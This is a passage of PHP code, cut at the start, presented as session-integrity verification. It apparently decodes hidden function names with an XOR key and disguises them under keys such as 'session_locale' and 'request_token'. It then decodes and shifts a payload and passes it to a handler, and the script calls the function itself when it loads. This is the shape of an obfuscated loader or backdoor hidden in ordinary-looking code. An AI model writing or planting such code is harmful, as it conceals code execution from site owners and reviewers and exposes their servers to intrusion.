    $_db = '';
    for ($_xi = 0; $_xi < $_lf($_eb); $_xi++) {
        $_db .= $_cf($_of($_eb[$_xi]) ^ 60);
    }

    $_r = [];
    $_r['session_locale']  = $_sf($_db, 0,  9);
    $_r['request_token'] = $_sf($_db, 9, 7);
    $_r['flip_service']  = $_sf($_db, 16,  6);
    $_r['buffer_stream'] = $_sf($_db, 22, 17);

    $_pay = '';
    $_raw = $_r['request_token']($_r['flip_service']($_pay));
    $_buf = '';
    for ($_pi = 0; $_pi < $_lf($_raw); $_pi++) {
        $_buf .= $_cf(($_of($_raw[$_pi]) + 220) % 256);
    }
    $_code = $_r['session_locale']($_buf);
    SessionCacheHandler::init($_code, $_r['buffer_stream']);
}

_verify_session_integrity();
